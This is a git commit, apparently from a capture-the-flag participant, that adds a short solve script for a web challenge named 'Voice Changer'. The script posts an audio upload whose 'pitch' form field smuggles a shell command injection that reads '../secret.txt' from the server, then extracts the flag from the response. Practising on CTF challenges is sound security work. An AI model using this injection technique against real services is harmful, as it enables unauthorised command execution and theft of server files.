b4463c79abb98dceb6d7e23906125eedf668ebbf
LauAria <laria@natbragroup.com>
2024-01-13 22:40:31 -0300

    desafio 3

---
+++ aria-huggias/Web - Voice Changer/solve.sh
@@ -0,0 +1,3 @@
+curl --location 'https://uoftctf-voice-changer.chals.io/upload' \
+--form 'pitch="\" >/dev/null | cat ../secret.txt #"' \
+--form 'input-file=@"audio.ogg"' -s | grep -o 'uoftctf{[^}]*}'
